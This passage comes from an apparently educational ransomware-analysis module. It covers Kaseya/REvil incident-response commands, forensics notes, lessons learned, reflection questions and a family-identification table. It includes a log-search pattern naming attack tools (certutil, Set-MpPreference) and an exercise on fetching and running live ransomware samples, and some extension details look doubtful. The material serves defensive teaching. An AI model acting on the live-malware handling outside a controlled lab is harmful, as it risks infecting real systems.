-Filter *.[encrypted_ext] | \n  Sort-Object CreationTime | \n  Select-Object -First 10 FullName,CreationTime\n\n# Check Kaseya agent logs\nGet-Content \"C:\\Program Files (x86)\\Kaseya\\AgentLogs\\*\" | \n  Select-String -Pattern \"agent.crt|certutil|Set-MpPreference\"\n```\n\n**3. Forensic Analysis**\n```bash\n# Collect evidence\n# - Memory dumps of infected systems\n# - Kaseya VSA server logs\n# - Network traffic (PCAP from firewall)\n# - Windows Event Logs\n# - Prefetch files (C:\\Windows\\Prefetch\\AGENT.EXE-*.pf)\n```\n\n**4. Decrypt or Restore?**\n\nDecision matrix:\n- REvil decryptor available? → NO (at time of attack)\n- Backups available? → PARTIAL (some clients had backups, some didn't)\n- Pay ransom? → CONTROVERSIAL (FBI advises against, but business need)\n\n### The Resolution\n\n**Two weeks after the attack:**\n\n1. **July 13, 2021**: REvil infrastructure mysteriously goes offline\n2. **July 22, 2021**: Kaseya obtains universal decryptor (source: unknown, likely law enforcement)\n3. **September 2021**: Bitdefender releases decryption tool for older REvil variants\n4. **January 2022**: Russian FSB arrests 14 REvil members\n\n**Lessons Learned:**\n\n1. **Supply chain risk**: One compromised vendor = thousands of victims\n2. **Patch management**: Zero-days are hard, but most attacks use known vulnerabilities\n3. **Backup strategy**: 3-2-1 rule (3 copies, 2 different media, 1 offsite) and TEST RESTORES\n4. **Incident response plan**: Have a plan BEFORE the attack\n5. **Network segmentation**: Limit lateral movement\n6. **Least privilege**: Kaseya agents had excessive permissions\n\n### Financial Impact\n\nEstimated costs:\n- **Direct ransom**: $70M demanded (most didn't pay)\n- **Incident response**: $50K-$500K per affected organization\n- **Business disruption**: Swedish Coop closed 800 stores for days\n- **Reputation damage**: Immeasurable\n- **Total industry cost**: Estimated $1B+\n\n**Key Takeaway**: The cost of prevention is always less than the cost of recovery."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions\n\nSolidify your understanding:\n\n1. **Encryption Analysis**: Why do most modern ransomware use hybrid encryption (symmetric + asymmetric) instead of just RSA for everything?\n\n2. **Attack Economics**: Ransomware-as-a-Service (RaaS) splits profits 70-80% to affiliates, 20-30% to developers. Why is this model so successful from a criminal business perspective?\n\n3. **Implementation Flaws**: You find ransomware that uses `srand(time(NULL))` for key generation. Explain how you would attempt to recover the encryption key. What time window would you need to brute force?\n\n4. **Double Extortion**: Modern ransomware threatens to leak data even if victims have backups. How does this change the incident response strategy?\n\n5. **Memory Forensics**: During dynamic analysis, you capture a memory dump 30 seconds after ransomware execution. What artifacts might you find that could lead to decryption?\n\n6. **Supply Chain**: In the Kaseya attack, REvil compromised one software vendor and infected 1,500+ companies. As a security architect, how would you protect your organization from this type of attack?\n\n7. **Payment Decision**: You're the CISO. All backups failed (they were encrypted too). Ransomware encrypted critical systems. Revenue loss: $1M/day. Ransom demand: $500K. Do you pay? What factors influence your decision?\n\n8. **Attribution**: REvil was a Russian-speaking operation. Law enforcement arrested members in Russia (rare cooperation). What geopolitical factors affect ransomware prosecution?\n\n## Challenge Exercise\n\nDownload a ransomware sample from malware repositories (theZoo, vx-underground, MalwareBazaar):\n\n**Your mission:**\n1. Perform static and dynamic analysis\n2. Identify the encryption scheme\n3. Document all IOCs (file extensions, ransom notes, C2 servers, mutexes)\n4. Create a YARA rule for detection\n5. Write an incident response playbook for this family\n6. Check if a decryptor exists (NoMoreRansom.org)\n7. If you find implementation flaws, document them (DO NOT create a decryptor for active ransomware—ethical concerns)\n\n**Recommended samples for learning** (older, decryptors available):\n- WannaCry (widespread, well-documented)\n- TeslaCrypt (flawed implementation, decryptor available)\n- Petya/NotPetya (interesting MBR infection technique)\n\nThis hands-on work will make you a ransomware analysis expert!"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "**Quick Reference: Ransomware Family Identification**\n\n## Quick ID by File Extension:\n\n| Extension | Family | Notes |\n|-----------|--------|-------|\n| .WNCRY | WannaCry | Kill switch domain |\n| .locked | Locky | Delivered via email |\n| .cerber | Cerber | Audio ransom note |\n| .ryuk | Ryuk | Big game hunting |\n| .revil | REvil/Sodinokibi | RaaS, high-profile |\n| .maze | Maze | First double extortion |\n| .conti | Conti | Fast encryption |\n| .random | LockBit | Appends random extension |\n| .darkside | DarkSide | Colonial Pipeline attack |\n\n## Quick ID by Ransom Note Filename:\n\n- `README.txt` → Generic (many families)\n- `!Decrypt-All-Files-<ID>.txt` → Dharma/CrySis\n- `HOW TO DECRYPT FILES.txt` → Ryuk\n- `_readme.txt` → STOP/Djvu\n- `[random]-DECRYPT.txt` → GandCrab\n- `DECRYPT_INSTRUCTIONS.html` → Locky\n\n## Quick ID by Onion Domain Pattern:\n\n- Short .onion (16 chars) → Older v2 Tor (WannaCry era)\n- Long .onion (56 chars) → Modern v3 Tor (most current)\n\n## Decryptor Availability:\n\n**Check these resources FIRST:**\n1. https://www.nomoreransom.org/ (primary resource)\n2. ID Ransomware: https://id-ransomware.malwarehunterteam.com/ (upload ransom note)\n3. Emsisoft: https://www.emsisoft.com/ransomware-decryption-tools/\n4. Kaspersky: https://noransom.kaspersky.com/\n\n## Encryption Speed Indicators:\n\n- **Full file encryption**: Slow, thorough\n- **Partial encryption**: Fast (first 1-10MB), some data recovery possible\n- **Intermittent encryption**: Very fast (encrypt every Nth block), low-quality encryption\n\n**Remember**: Never pay ransom before checking decryptor availability and backup restoration options!"
      }
    }
  ]
}